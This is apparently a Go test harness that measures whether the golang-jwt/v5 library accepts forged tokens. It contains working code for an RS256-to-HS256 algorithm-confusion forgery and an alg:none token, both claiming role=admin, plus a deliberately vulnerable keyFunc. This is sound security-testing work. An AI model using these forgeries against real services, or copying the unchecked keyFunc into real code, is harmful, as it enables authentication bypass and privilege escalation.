// Cross-language — Go golang-jwt/v5 algorithm confusion (RS256->HS256) + alg:none.
// DY limit: attacker knows only the issuer's RSA PUBLIC key; signs an HS256
// role=admin token using the public-key PEM as the HMAC secret.
// Emits RESULT lines for the orchestrator.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func b(err error) string {
	if err == nil {
		return "nil"
	}
	m := err.Error()
	if len(m) > 44 {
		m = m[:44]
	}
	return m
}

func main() {
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	pubDER, _ := x509.MarshalPKIXPublicKey(&priv.PublicKey)
	pubPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubDER})

	// forged HS256 token: pubPEM used as HMAC secret, role=admin
	forged := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{"role": "admin", "iss": "real-issuer"})
	forgedStr, _ := forged.SignedString(pubPEM)

	// alg:none token (role=admin)
	noneStr, _ := jwt.NewWithClaims(jwt.SigningMethodNone, jwt.MapClaims{"role": "admin"}).
		SignedString(jwt.UnsafeAllowNoneSignatureType)

	fmt.Println("======================================================================")
	fmt.Println("golang-jwt/v5 v5.2.1 — algorithm confusion & alg:none")
	fmt.Println("======================================================================")

	confusionTP := 0

	// (1) SAFE usage: keyFunc returns the typed *rsa.PublicKey (recommended pattern)
	tok, err := jwt.Parse(forgedStr, func(t *jwt.Token) (interface{}, error) {
		return &priv.PublicKey, nil
	})
	safeAccept := err == nil && tok.Valid
	fmt.Printf("  [%s] confusion, keyFunc→*rsa.PublicKey (safe)     %s  %s\n",
		tag(safeAccept), verdict(safeAccept), b(err))

	// (2) VULNERABLE usage: keyFunc returns the PEM bytes without checking t.Method
	//     (a real, widely-documented misuse pattern).
	tok2, err2 := jwt.Parse(forgedStr, func(t *jwt.Token) (interface{}, error) {
		return pubPEM, nil // <-- bytes; HS256 will use them as the HMAC secret
	})
	vulnAccept := err2 == nil && tok2.Valid && role(tok2) == "admin"
	if vulnAccept {
		confusionTP = 1
	}
	fmt.Printf("  [%s] confusion, keyFunc→PEM bytes (unsafe usage)  %s  role=%s %s\n",
		tag(vulnAccept), verdict(vulnAccept), role(tok2), b(err2))

	// (3) alg:none against a normal parser (no 'none' allowed)
	tok3, err3 := jwt.Parse(noneStr, func(t *jwt.Token) (interface{}, error) {
		return &priv.PublicKey, nil
	})
	noneAccept := err3 == nil && tok3.Valid
	fmt.Printf("  [%s] alg:none (default parser)                    %s  %s\n",
		tag(noneAccept), verdict(noneAccept), b(err3))

	fmt.Println("----------------------------------------------------------------------")
	fmt.Printf("RESULT\tgolang-jwt/v5 5.2.1\tconfusion_TP=%d\tnote=full-forgery-under-documented-misuse\n", confusionTP)
}

func role(t *jwt.Token) string {
	if t == nil {
		return "-"
	}
	if c, ok := t.Claims.(jwt.MapClaims); ok {
		if r, ok := c["role"].(string); ok {
			return r
		}
	}
	return "-"
}
func tag(a bool) string {
	if a {
		return "A"
	}
	return "OK"
}
func verdict(a bool) string {
	if a {
		return "ACCEPT"
	}
	return "REJECT"
}
